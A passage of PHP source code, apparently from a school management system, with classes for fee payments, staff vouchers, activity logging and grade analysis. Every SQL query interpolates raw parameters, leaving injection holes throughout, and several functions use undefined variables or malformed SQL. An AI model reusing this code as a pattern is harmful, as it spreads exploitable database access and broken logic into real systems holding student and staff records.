        $query=mysqli_query(dbass::Connect(),"SELECT * from school_fee where reg_no='$reg_no' and session='$session' and s_fee3rd>0 ");
      }

        $res=mysqli_num_rows($query);
        if($res>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    /** This is the module that adds a student to the fee table */
    public static function AddFee($reg_no,$class,$session,$s_fee1st,$s_fee2nd,$s_fee3rd,$reg_fee,$pta,$scard,$books,$lesson,$amount,$ref)
    {
      if(!(Finance::IsFeeRefExist($ref)))
      {
        $query=mysqli_query(dbass::Connect(),"INSERT into school_fee (reg_no,`class`,`session`,s_fee1st, s_fee2nd, s_fee3rd, reg_fee, pta,scard, books, lesson,`date`,`time`,ref,amount,balance) values('$reg_no','$class','$session','$s_fee1st','$s_fee2nd','$s_fee3rd','$reg_fee','$pta','$scard','$books','$lesson',CURRENT_DATE,CURRENT_TIME,'$ref','$amount','$balance')");
        if($query){
          $news=true;
          Activity::Add($_SESSION['userid'],"Finance","AddFee","A payment transaction was made by $reg_no in $class in the $session $term 1st Term: $s_fee1st; 2nd Term: $s_fee2nd; 3rd Term: $s_fee3rd; Registration Fee: $reg_fee; PTA: $pta; Scratch Card: $scard; Books: $books; Lesson: $lesson; Payable Amount: $amount; Payment Reference: $ref",$session,$term);
        }
        else{
          $news=false;
        }

      }
      

      return $news;
    }

    /** This is to Add new Voucher */
    public static function AddVoucher($ref,$staffid,$date,$month,$year,$sgl,$lateness,$duty,$lesson_plan_note,$absenteesm,$scheme,$savings,$staff_welfare,$amount,$balance){
      
      $query=mysqli_query(dbass::Connect(),"INSERT into 
        voucher (ref,staff_id,`date`,month, year, sgl, lateness, duty, lesson_plan_note, absenteesm,scheme,savings,staff_welfare, amount, balance) 
        values('$ref','$staffid','$date','$month','$year','$sgl','$lateness','$duty','$lesson_plan_note','$absenteesm','$scheme','$savings','$staff_welfare','$amount','$balance')");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }

      return $news;
    }

    /** This is to Add new Voucher */
    public static function AddFeeAmount($class,$reg_fee,$s_fee1st,$s_fee2nd,$s_fee3rd,$pta,$scard,$books,$lesson_fee){
      
      $query=mysqli_query(dbass::Connect(),"INSERT into 
        fee_amount (class,`reg_fee`,s_fee1st, s_fee2nd, s_fee3rd, pta, scard, books, lesson_fee) 
        values('$class','$reg_fee','$s_fee1st','$s_fee2nd','$s_fee3rd','$pta','$scard','$books','$lesson_fee')");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }

      return $news;
    }


    //Fee Payment Module starts here

     public static function IsRefExist($ref)
     {
        $query=mysqli_query(dbass::Connect(),"SELECT * from fee_payment where ref='$ref' ");
        $count=mysqli_num_rows($query);
        if($count>0)
        {
          $rs= true;
        }
        else
        {
          $rs= false;
        }
        return $rs;
     }


    
    /** This is to check whether Voucher Ref already exist*/
    public static function IsFee_Paid($reg_no,$session,$term){
      $studentDetails=Module::ReadStudentDetailsp($reg_no);
      $class=$studentDetails['class'];
      $feeAmount=Finance::ReadFee_Pay_AmountTermDetails($class,$session,$term);
      $feeDetails=Finance::ReadStudentFee_PayDetails($reg_no,$session,$term);

      if($feeAmount['total']<=$feeDetails['total'])
      {
        $rs=True;
      }
      else
      {
        $rs=False;
      }
      
      return $rs;
    }

    /** This is to Add new Voucher */
    public static function AddFee_Pay($reg_no,$ref,$class,$session,$term,$reg_fee,$fee,$book,$pta,$scard,$lesson){
      
      $query=mysqli_query(dbass::Connect(),"INSERT INTO `fee_payment` 
      (`reg_no`, `ref`, `class`, `term`, `session`, `reg_fee`, `fee`, `book`, `pta`, `lesson`, `scard`) 
      VALUES ('$reg_no', '$ref', '$class', '$term', '$session', '$reg_fee', '$fee', '$book', '$pta', '$lesson', '$scard')");
      if($query){
        $news=true;
      }
        echo $query->error;
          
      return $news;
    }

    public static function Updatefee_payment($id,$reg_no,$ref,$class,$session,$term,$reg_fee,$fee,$book,$pta,$scard,$lesson)
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE fee_payment set reg_no='$reg_no', `ref`='$ref', `class`='$class', `session`='$session', `term`='$term', `reg_fee`='$reg_fee', `fee`='$fee',`book`='$book', `pta`='$pta', `scard`='$scard', `lesson`='$lesson', `timestamp`=CURRENT_TIMESTAMP   where id='$id'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }

      return $news;
    }

    /** This is to Delete Voucher*/
    public static function DeleteFee_Pay($id){
        $query=mysqli_query(dbass::Connect(),"DELETE from fee_payment where id='$id'");

        if($query>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    /** This is to Delete Voucher*/
    public static function DeleteAllFee_Pay($class,$session,$term){
        $query=mysqli_query(dbass::Connect(),"DELETE from fee_payment where class='$class' and session='$session' and term='$term'");

        if($query>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    /** This is to Read Voucher Details*/
    public static function ReadFee_PayDetails($id){
        $query=mysqli_query(dbass::Connect(),"SELECT * from fee_payment where id='$id'");
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['reg_no']=$res['reg_no'];
          $news['ref']=$res['ref'];
          $news['class']=$res['class'];
          $news['session']=$res['session'];
          $news['term']=$res['term'];
          $news['reg_fee']=$res['reg_fee'];
          $news['fee']=$res['fee'];
          $news['book']=$res['book'];
          $news['pta']=$res['pta'];
          $news['lesson']=$res['lesson'];
          $news['scard']=$res['scard'];
          $news['total']=$res['reg_fee']+$res['fee']+$res['book']+$res['pta']+$res['scard']+$res['lesson'];
          $news['timestamp']=$res['timestamp'];
        }
        
        return $news;
    }

    /** This is to Read Voucher Details*/
    public static function ReadStudentFee_PayDetails($reg_no,$session,$term){
        $query=mysqli_query(dbass::Connect(),"SELECT * from fee_payment where reg_no='$reg_no' and session='$session' and term='$term'");
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['reg_no']=$res['reg_no'];
          $news['ref']=$res['ref'];
          $news['class']=$res['class'];
          $news['session']=$res['session'];
          $news['term']=$res['term'];
          $news['reg_fee']=$res['reg_fee'];
          $news['fee']=$res['fee'];
          $news['book']=$res['book'];
          $news['pta']=$res['pta'];
          $news['lesson']=$res['lesson'];
          $news['scard']=$res['scard'];
          $news['total']=$res['reg_fee']+$res['fee']+$res['book']+$res['pta']+$res['scard']+$res['lesson'];
          $news['timestamp']=$res['timestamp'];
        }
        
        return $news;
    }

    /** This is to Read Voucher Details*/
    public static function ReadReferenceFee_PayDetails($ref){
        $query=mysqli_query(dbass::Connect(),"SELECT * from fee_payment where ref='$ref'");
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['reg_no']=$res['reg_no'];
          $news['ref']=$res['ref'];
          $news['class']=$res['class'];
          $news['session']=$res['session'];
          $news['term']=$res['term'];
          $news['reg_fee']=$res['reg_fee'];
          $news['fee']=$res['fee'];
          $news['book']=$res['book'];
          $news['pta']=$res['pta'];
          $news['lesson']=$res['lesson'];
          $news['scard']=$res['scard'];
          $news['total']=$res['reg_fee']+$res['fee']+$res['book']+$res['pta']+$res['scard']+$res['lesson'];
          $news['timestamp']=$res['timestamp'];
        }
        
        return $news;
    }


    /** This is to Read All Vouchers*/
    public static function ReadAllFee_PayClass($class,$session,$term){
        $query=mysqli_query(dbass::Connect(),"SELECT * from fee_payment where class='$class' and session='$session' and term='$term' ");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }


    /** This is to Read All Vouchers*/
    public static function ReadAllStudentFee_Pay($reg_no){
        $query=mysqli_query(dbass::Connect(),"SELECT * from fee_payment where reg_no='$reg_no'");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    /** This is to Read All Vouchers*/
    public static function ReadAllFee_Pay(){
        $query=mysqli_query(dbass::Connect(),"SELECT * from fee_payment ");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    //Fee Payment Module ends here

    //Fee Payment Amount Module Starts here=========================================================
    
    /** This is to Add new Voucher */

    public static function AddFee_Pay_Amount($class,$session,$term,$reg_fee,$fee,$book,$lesson,$pta,$scard){
      
      $query=mysqli_query(dbass::Connect(),"INSERT into 
        fee_pay_amount (reg_fee,class,`session`,term,  fee, book, lesson, pta, scard) 
        values('$reg_fee','$class','$session','$term','$fee','$book','$lesson','$pta','$scard')");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }

      return $news;
    }

    public static function UpdateFee_Pay_Amount($id,$reg_fee,$class,$session,$term,$fee,$book,$lesson,$pta,$scard)
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE fee_pay_amount set reg_fee='$reg_fee', `session`='$session', `term`='$term',  `class`='$class', `fee`='$fee', `book`='$book',`lesson`='$lesson', `pta`='$pta', `scard`='$scard', `timestamp`=CURRENT_TIMESTAMP   where id='$id'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }

      return $news;
    }

    /** This is to Delete Voucher*/
    public static function DeleteFee_Pay_Amount($id){
        $query=mysqli_query(dbass::Connect(),"DELETE from fee_pay_amount where id='$id'");

        if($query>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    /** This is to Read Voucher Details*/
    public static function ReadFee_Pay_AmountDetails($id){
        $query=mysqli_query(dbass::Connect(),"SELECT * from fee_pay_amount where id='$id'");
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['reg_fee']=$res['reg_fee'];
          $news['class']=$res['class'];
          $news['session']=$res['session'];
          $news['term']=$res['term'];
          $news['fee']=$res['fee'];
          $news['book']=$res['book'];
          $news['lesson']=$res['lesson'];
          $news['pta']=$res['pta'];
          $news['scard']=$res['scard'];
          $news['total']=$res['reg_fee']+$res['fee']+$res['book']+$res['pta']+$res['scard']+$res['lesson'];
          $news['timestamp']=$res['timestamp'];
        }
        
        return $news;
    }

    /** This is to Read Voucher Details*/
    public static function ReadFee_Pay_AmountTermDetails($class,$session,$term){
        $query=mysqli_query(dbass::Connect(),"SELECT * from fee_pay_amount where session='$session' and  term='$term' and  class='$class'");
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['reg_fee']=$res['reg_fee'];
          $news['class']=$res['class'];
          $news['session']=$res['session'];
          $news['term']=$res['term'];
          $news['fee']=$res['fee'];
          $news['book']=$res['book'];
          $news['lesson']=$res['lesson'];
          $news['pta']=$res['pta'];
          $news['scard']=$res['scard'];
          $news['total']=$res['reg_fee']+$res['fee']+$res['book']+$res['pta']+$res['scard']+$res['lesson'];
          $news['timestamp']=$res['timestamp'];
        }
        
        return $news;
    }

    /** This is to Read All Vouchers*/
    public static function ReadAllFee_Pay_Amount(){
        $query=mysqli_query(dbass::Connect(),"SELECT * from fee_pay_amount ");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    //Fee Payment Amount Module End here


    public static function UpdateFeeAmount($id,$reg_fee,$class,$s_fee1st,$s_fee2nd,$s_fee3rd,$pta,$scard,$books,$lesson_fee)
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE fee_amount set reg_fee='$reg_fee', `class`='$class', `s_fee1st`='$s_fee1st', `s_fee2nd`='$s_fee2nd', `s_fee3rd`='$s_fee3rd', `pta`='$pta',`scard`='$scard', `books`='$books', `lesson_fee`='$lesson_fee', `timestamp`=CURRENT_TIMESTAMP   where id='$id'");
      if($query){
        $news=true;
        $currentsession=Module::ReadCurrentSession();
        Activity::Add($_SESSION['userid'],"Finance","AddFee","A payment Amount was modified as follows: Reg Fee: $reg_fee; 1st Term: $s_fee1st; 2nd Term: $s_fee2nd; 3rd Term: $s_fee3rd;  PTA: $pta; Scratch Card: $scard; Books: $books; Lesson: $lesson; ID: $id",$currentsession['session'],$currentsession['term']);
      }
      else{
        $news=false;
      }

      return $news;
    }

    /** This is to Modify Fee*/
    public static function UpdateFee($ref,$reg_no,$class,$session,$s_fee1st,$s_fee2nd,$s_fee3rd,$reg_fee,$pta,$scard,$books,$lesson,$amount,$balance){
      if(Finance::IsFeeRefExist($ref))
      {
        $query=mysqli_query(dbass::Connect(),"UPDATE school_fee set reg_no='$reg_no', `class`='$class', `session`='$session', `s_fee1st`='$s_fee1st', `s_fee2nd`='$s_fee2nd', `s_fee3rd`='$s_fee3rd', `reg_fee`='$reg_fee', `pta`='$pta',`scard`='$scard', `books`='$books', `lesson`='$lesson',`amount`='$amount',`balance`='$balance', `date`=CURRENT_DATE, `time`=CURRENT_TIME   where ref='$ref'");
        if($query){
          $news=true;
          Activity::Add($_SESSION['userid'],"Finance","AddFee","A payment transaction was modified by $reg_no in $class in the $session $term 1st Term: $s_fee1st; 2nd Term: $s_fee2nd; 3rd Term: $s_fee3rd; Registration Fee: $reg_fee; PTA: $pta; Scratch Card: $scard; Books: $books; Lesson: $lesson; Payable Amount: $amount; Payment Reference: $ref",$session,$term);
        }
        else{
          $news=false;
        }
      }
      else
      {
        $news=false;
      }

      return $news;
    }


    /** This is to Modify Voucher*/
    public static function UpdateVoucher($id,$ref,$staffid,$date,$month,$year,$sgl,$lateness,$duty,$lesson_plan_note,$absenteesm,$scheme,$savings,$staff_welfare,$amount,$balance){
      if(Finance::IsVoucherRefExist($ref))
      {
        $query=mysqli_query(dbass::Connect(),"UPDATE voucher set  staff_id='$staffid', `date`='$date', month='$month', year='$year', sgl='$sgl' , lateness='$lateness' , duty='$duty'  , lesson_plan_note='$lesson_plan_note'  , absenteesm='$absenteesm'  , scheme='$scheme'  , savings='$savings'  , staff_welfare='$staff_welfare'  , amount='$amount'  , balance='$balance'  where ref='$ref'");
        if($query){
          $news=true;
        }
        else{
          $news=false;
        }
      }
      else
      {
        $news=false;
      }

        return $news;
    }

    /** This is to Delete Voucher*/
    public static function DeleteVoucher($id){
        $query=mysqli_query(dbass::Connect(),"DELETE from voucher where id='$id'");

        if($query>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    /** This is to Delete Fee*/
    public static function DeleteFee($id){
        $query=mysqli_query(dbass::Connect(),"DELETE from fees where id='$id'");

        if($query>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    /** This is to Delete Fee*/
    public static function DeleteFeeAmount($id){
        $query=mysqli_query(dbass::Connect(),"DELETE from fee_amount where id='$id'");

        if($query>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    /** This is to Read All Vouchers*/
    public static function ReadAllVouchers($month,$year){
        $query=mysqli_query(dbass::Connect(),"SELECT * from voucher where year='$year' and month='$month'");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    /** This is to Read All Fees*/
    public static function ReadAllFees($session,$class){
        $query=mysqli_query(dbass::Connect(),"SELECT * from school_fee where session='$session' and `class`='$class' ");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    /** This is to Read All Fees*/
    public static function ReadStudentFees($reg){
        $query=mysqli_query(dbass::Connect(),"SELECT * from school_fee where reg_no='$reg' ");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    /** This is to Read All Voucher's Months*/
    public static function ReadVoucherMonthsLimit($year,$limit){
        $query=mysqli_query(dbass::Connect(),"SELECT * from voucher where year='$year' limit 0,$limit");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    /** This is to Read All Voucher's Months*/
    public static function ReadMonthsVoucher($month,$year){
        $query=mysqli_query(dbass::Connect(),"SELECT * from voucher where month='$month' and year='$year'");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    /** This is to Read All Staff Vouchers*/
    public static function ReadStaffVouchers($staffid){
        $query=mysqli_query(dbass::Connect(),"SELECT * from voucher where staff_id='$staffid'");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    /** This is to Read Voucher Details*/
    public static function ReadVoucherDetails($id){
        $query=mysqli_query(dbass::Connect(),"SELECT * from voucher where id='$id'");
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['ref']=$res['ref'];
          $news['staffid']=$res['staff_id'];
          $news['date']=$res['date'];
          $news['month']=$res['month'];
          $news['year']=$res['year'];
          $news['sgl']=$res['sgl'];
          $news['lateness']=$res['lateness'];
          $news['duty']=$res['duty'];
          $news['lesson_plan_note']=$res['lesson_plan_note'];
          $news['absenteesm']=$res['absenteesm'];
          $news['scheme']=$res['scheme'];
          $news['savings']=$res['savings'];
          $news['staff_welfare']=$res['staff_welfare'];
          $news['amount']=$res['amount'];
          $news['balance']=$res['balance'];
          $news['timestamp']=$res['timestamp'];
        }
        
        return $news;
    }

    /** This is to Read Voucher Details*/
    public static function ReadVoucherDetailsData($staff_id,$month,$year){
        $query=mysqli_query(dbass::Connect(),"SELECT * from voucher where staff_id='$staff_id' and  month='$month' and  year='$year'");
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['ref']=$res['ref'];
          $news['staffid']=$res['staff_id'];
          $news['date']=$res['date'];
          $news['month']=$res['month'];
          $news['year']=$res['year'];
          $news['sgl']=$res['sgl'];
          $news['lateness']=$res['lateness'];
          $news['duty']=$res['duty'];
          $news['lesson_plan_note']=$res['lesson_plan_note'];
          $news['absenteesm']=$res['absenteesm'];
          $news['scheme']=$res['scheme'];
          $news['savings']=$res['savings'];
          $news['staff_welfare']=$res['staff_welfare'];
          $news['amount']=$res['amount'];
          $news['balance']=$res['balance'];
          $news['timestamp']=$res['timestamp'];
        }
        
        return $news;
    }

    /** This is to Read All Staff Vouchers*/
    public static function ReadFeeAmounts(){
        $query=mysqli_query(dbass::Connect(),"SELECT * from fee_amount ");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    /** This is to Read Fee Amounts Details*/
    public static function ReadFeeAmountDetails($id){
        $query=mysqli_query(dbass::Connect(),"SELECT * from fee_amount where id='$id'");
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['class']=$res['class'];
          $news['reg_fee']=$res['reg_fee'];
          $news['s_fee1st']=$res['s_fee1st'];
          $news['s_fee2nd']=$res['s_fee2nd'];
          $news['s_fee3rd']=$res['s_fee3rd'];
          $news['pta']=$res['pta'];
          $news['books']=$res['books'];
          $news['lesson_fee']=$res['lesson_fee'];
          $news['scard']=$res['scard'];
          $news['total']=$res['reg_fee']+$res['s_fee1st']+$res['s_fee2nd']+$res['s_fee3rd']+$res['pta']+$res['books']+$res['lesson_fee']+$res['scard'];         
          $news['timestamp']=$res['timestamp'];
        }
        
        return $news;
    }

    /** This is to Read Fee Amounts Details*/
    public static function ReadClassFeeAmountDetails($class){
        $query=mysqli_query(dbass::Connect(),"SELECT * from fee_amount where class='$class'");
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['class']=$res['class'];
          $news['reg_fee']=$res['reg_fee'];
          $news['s_fee1st']=$res['s_fee1st'];
          $news['s_fee2nd']=$res['s_fee2nd'];
          $news['s_fee3rd']=$res['s_fee3rd'];
          $news['pta']=$res['pta'];
          $news['books']=$res['books'];
          $news['lesson_fee']=$res['lesson_fee'];
          $news['scard']=$res['scard'];
          $news['total']=$res['reg_fee']+$res['s_fee1st']+$res['s_fee2nd']+$res['s_fee3rd']+$res['pta']+$res['books']+$res['lesson_fee']+$res['scard'];         
          $news['timestamp']=$res['timestamp'];
        }
        
        return $news;
    }

    /** This is to Read Voucher Details*/
    public static function ReadFeeDetails($id){
        $query=mysqli_query(dbass::Connect(),"SELECT * from school_fee where id='$id'");
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['reg_no']=$res['reg_no'];
          $news['session']=$res['session'];
          $news['class']=$res['class'];
          $news['s_fee1st']=$res['s_fee1st'];
          $news['s_fee2nd']=$res['s_fee2nd'];
          $news['s_fee3rd']=$res['s_fee3rd'];
          $news['reg_fee']=$res['reg_fee'];
          $news['pta']=$res['pta'];
          $news['scard']=$res['scard'];
          $news['books']=$res['books'];
          $news['lesson']=$res['lesson'];
          $news['date']=$res['date'];
          $news['time']=$res['time'];
          $news['ref']=$res['ref'];
          $news['totalpaid']=$res['s_fee1st']+$res['s_fee2nd']+$res['s_fee3rd']+$res['reg_fee']+$res['pta']+$res['books']+$res['lesson'];
          $news['amount']=$res['amount'];
          $news['balance']=$res['amount']-$news['totalpaid'];
          $news['status']=$res['status'];
          $news['timestamp']=$res['timestamp'];
        }
        
        return $news;
    }

    /** This is to Read Voucher Details*/
    public static function ReadStudentFeeDetails($reg_no,$class,$session){
        $query=mysqli_query(dbass::Connect(),"SELECT * from school_fee where reg_no='$reg_no' and class='$class' and session='$session'");
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['reg_no']=$res['reg_no'];
          $news['session']=$res['session'];
          $news['class']=$res['class'];
          $news['ref']=$res['ref'];
          $news['s_fee1st']=$res['s_fee1st'];
          $news['s_fee2nd']=$res['s_fee2nd'];
          $news['s_fee3rd']=$res['s_fee3rd'];
          $news['reg_fee']=$res['reg_fee'];
          $news['pta']=$res['pta'];
          $news['scard']=$res['scard'];
          $news['books']=$res['books'];
          $news['lesson']=$res['lesson'];
          $news['date']=$res['date'];
          $news['time']=$res['time'];
          $news['totalpaid']=$res['s_fee1st']+$res['s_fee2nd']+$res['s_fee3rd']+$res['reg_fee']+$res['pta']+$res['books']+$res['lesson'];
          $news['amount']=$res['amount'];
          $news['balance']=$res['amount']-$news['totalpaid'];
          $news['status']=$res['status'];
          $news['timestamp']=$res['timestamp'];
        }
        
        return $news;
    }

    /** This is to Read Voucher Details By Ref*/
    public static function ReadVoucherDetailsRef($ref){
        $query=mysqli_query(dbass::Connect(),"SELECT * from voucher where ref='$ref'");
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['ref']=$res['ref'];
          $news['staffid']=$res['staff_id'];
          $news['date']=$res['date'];
          $news['month']=$res['month'];
          $news['year']=$res['year'];
          $news['sgl']=$res['sgl'];
          $news['lateness']=$res['lateness'];
          $news['duty']=$res['duty'];
          $news['lesson_plan_note']=$res['lesson_plan_note'];
          $news['absenteesm']=$res['absenteesm'];
          $news['scheme']=$res['scheme'];
          $news['savings']=$res['savings'];
          $news['staff_welfare']=$res['staff_welfare'];
          $news['amount']=$res['amount'];
          $news['balance']=$res['balance'];
          $news['timestamp']=$res['timestamp'];
        }
        
        return $news;
    }
}

//Finance Module
class Activity extends dbass {  
  public static function IsExist($user,$category,$function,$description,$session,$term)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from activities where user='$user' and  category='$category' and  function='$function' and description='$description' and session='$session' and term='$term' ");
    $count=mysqli_num_rows($query);
    if($count>1)
    {
      return true;
    }
    else
    {
      return false;
    }
  }

    /** This is the module that adds an Activity */
    public static function Add($user,$category,$function,$description,$session,$term)
    {
      if(!(Activity::IsExist($user,$category,$function,$description,$session,$term)))
      {        
        $query=mysqli_query(dbass::Connect(),"INSERT into 
          activities (`user`,`category`,`function`,`description`,`date`,`time`,`timestamp`,`session`,`term`) 
          values('$user','$category','$function','$description',CURRENT_DATE,CURRENT_TIME,CURRENT_TIMESTAMP,'$session','$term')");
        if($query){
          $news=true;
        }
        else{
          $news=false;
        }
      }

      return $news;
    }

    /** This is to Modify Fee*/
    public static function Update($id,$user,$category,$function,$description){
      $query=mysqli_query(dbass::Connect(),"UPDATE activities set user='$user', category='$category', `function`='$function', `description`='$description' `date`=CURRENT_DATE, `time`=CURRENT_TIME, `timestamp`=CURRENT_TIMESTAMP  where id='$id'");
      if($query){
        $news=true;
      }
      else{
        $news=false;
      }

      return $news;
    }

    /** This is to Delete Fee*/
    public static function Delete($id){
        $query=mysqli_query(dbass::Connect(),"DELETE from activities where id='$id'");

        if($query>0)
        {
            $rs=True;
        }
        
        return $rs;
    }

    /** This is to Read All Activities*/
    public static function ReadAllActivities(){
        $query=mysqli_query(dbass::Connect(),"SELECT * from activities ");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    /** This is to Read All Activities*/
    public static function ReadSessionActivities($session){
        $query=mysqli_query(dbass::Connect(),"SELECT * from activities where term='$term'");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    /** This is to Read All Activities*/
    public static function ReadTermActivities($session,$term){
        $query=mysqli_query(dbass::Connect(),"SELECT * from activities where term='$term' and session='$session'");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    /** This is to Read All Activities*/
    public static function ReadDateActivities($date){
        $query=mysqli_query(dbass::Connect(),"SELECT * from activities where `date`='$date'");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    /** This is to Read All Activities*/
    public static function ReadUserActivities($user){
        $query=mysqli_query(dbass::Connect(),"SELECT * from activities where `user`='$user'");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    /** This is to Read All Activities*/
    public static function ReadTimeActivities($time){
        $query=mysqli_query(dbass::Connect(),"SELECT * from activities where `time`='$time'");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    /** This is to Read All Activities*/
    public static function ReadTimestampActivities($timestamp){
        $query=mysqli_query(dbass::Connect(),"SELECT * from activities where `timestamp`='$timestamp'");
        $news=array();
        while($res=mysqli_fetch_array($query))
        {
            if(!in_array($res['id'], $news)){
              array_push($news, $res['id']);
            }
        }
        
        return $news;
    }

    /** This is to Read Voucher Details*/
    public static function ReadDetails($id){
        $query=mysqli_query(dbass::Connect(),"SELECT * from activities where id='$id'");
        while($res=mysqli_fetch_array($query))
        {
          $news['id']=$res['id'];
          $news['user']=$res['user'];
          $news['category']=$res['category'];
          $news['function']=$res['function'];
          $news['description']=$res['description'];
          $news['timestamp']=$res['timestamp'];
          $news['time']=$res['time'];
          $news['date']=$res['date'];
          $news['session']=$res['session'];
          $news['term']=$res['term'];
        }
        
        return $news;
    }
}

//Result Analysis Module
class Analysis extends dbass {  

  public static function ReadSubjectResultSummary($class,$subject,$session,$term){
     
    $news['subject']=$res['subject'];
    $news['session']=$res['session'];
    $news['term']=$res['term'];
    $news['total_grade_A+']=Analysis::CountSubjectGrade($class,$session,$term,$subject,"A+");
    $news['total_students']=Analysis::CountSubjectStudents($class,$session,$term,$subject);
    $news['total_grade_A']=Analysis::CountSubjectGrade($class,$session,$term,$subject,"A");
    $news['total_grade_B']=Analysis::CountSubjectGrade($class,$session,$term,$subject,"B");
    $news['total_grade_C']=Analysis::CountSubjectGrade($class,$session,$term,$subject,"C");
    $news['total_grade_D']=Analysis::CountSubjectGrade($class,$session,$term,$subject,"D");
    $news['total_grade_E']=Analysis::CountSubjectGrade($class,$session,$term,$subject,"E");
    $news['total_grade_F']=Analysis::CountSubjectGrade($class,$session,$term,$subject,"F");
    $news['high_score']=Analysis::GetSubjectHighestScore($class,$session,$term,$subject);
    $news['least_score']=Analysis::GetSubjectLeastScore($class,$session,$term,$subject);
    $news['total_high_score']=Analysis::CountSubjectScore($class,$session,$term,$subject,$news['high_score']);
    $news['total_least_score']=Analysis::CountSubjectScore($class,$session,$term,$subject,$news['least_score']);
    $news['total_pass']=Analysis::CountSubjectPass($class,$session,$term,$subject);
    $news['total_fail']=Analysis::CountSubjectFail($class,$session,$term,$subject);
      
    return $news;
  }

  public static function CountSubjectStudents($class,$session,$term,$subject)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where class='$class' and  session='$session' and  term='$term' and subject='$subject' ");
    $count=mysqli_num_rows($query);
    
    return $count;
  }

  public static function CountSubjectGrade($class,$session,$term,$subject,$grade)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult where class='$class' and  session='$session' and  term='$term' and subject='$subject' and grad_e='$grade' ");
    $count=mysqli_num_rows($query);
    
    return $count;
  }

  public static function CountSessionGrade($class,$session,$grade)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from psession_statistical_analysis where session='$session' and class='$class' and grade='$grade' ");
    $count=mysqli_num_rows($query);
    
    return $count;
  }

  public static function GetSessionClassAverage($class,$session)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT sum(average) from psession_statistical_analysis where session='$session' and class='$class' ");

    while($res=mysqli_fetch_array($query))
    {
      $total_average=$res[0];
    }    

    return $total_average;
  }

  public static function GetSessionClassMaximumAverage($class,$session)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT max(average) from psession_statistical_analysis where session='$session' and class='$class'");
    while($res=mysqli_fetch_array($query))
    {
      $news=$res[0];
    }   

    return $news;
  }

  public static function GetSessionClassMinimumAverage($class,$session)
  {
